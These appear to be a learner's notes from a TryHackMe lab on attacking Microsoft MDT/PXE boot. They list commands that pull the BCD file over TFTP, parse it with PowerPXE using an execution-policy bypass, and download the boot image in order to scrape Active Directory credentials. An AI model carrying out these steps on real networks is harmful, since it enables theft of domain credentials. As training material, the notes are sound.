MDT is a Microsoft service that assist wit automating the deployment of Microsoft Operating System.
Usually, MDT is integrated with Microsoft's System Center Configuration Manager SCCM, wich manages all the updates. MDT for fresh installations.

### PXE Boot
PXE boot is usually integrated with DHCP

Once the process is performed, the client will use a [[TFTP]] connection to download the PXE boot image. We can exploit the PXE boot image for two different purposes:
- Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
- Perform password scraping attacks to recover AD credentials used during the install.

We will use the latter.

### PXE Boot Image Retrieval

[[DHCP]] is a bit finicky, we will bypass the initial steps of the attack, the part where we attempt to request an IP and the PXE boot preconfigure details from [[DHCP]]

Via DHCP we would receive the IP of the MDT server

The second piece of information is the name of the [[BCD]] files
Usually, we use TFTP to request each of these BCD files and enumerate the configuration for all of them

Let's ssh into a machine
`ssh thm@THMJMP1.za.tryhackme.com`

Let's create a folder with our username and copy powerpxe repo into it
```
C:\Users\THM>cd Documents 
C:\Users\THM\Documents> mkdir <username> 
C:\Users\THM\Documents> copy C:\powerpxe <username>\ 
C:\Users\THM\Documents\> cd <username>
```

The first ste is using TFTP and downloading our BCD file to read the configuration of the MDT server.

From the SSH
```
C:\Users\THM\Documents\Am0> tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
```

The we have to lookup THMMDT IP with `nslookup thmmdt.za.tryhackme.com`
With the BCD file recovered, we will be using powerpxe to read its contents
```
C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1 C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd" 
PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile >> Parse the BCD file: conf.bcd >>>> Identify wim file : <PXE Boot Image Location> <PXE Boot Image Location>
```

WIM files are bootable images in the Windows Imaging Format (WIM). Now that we have the location of the PXE Boot Image, we can use TFTP to download this image
```
tftp -i <THMMDT IP> GET "<PXE Boot Image Location>"
```
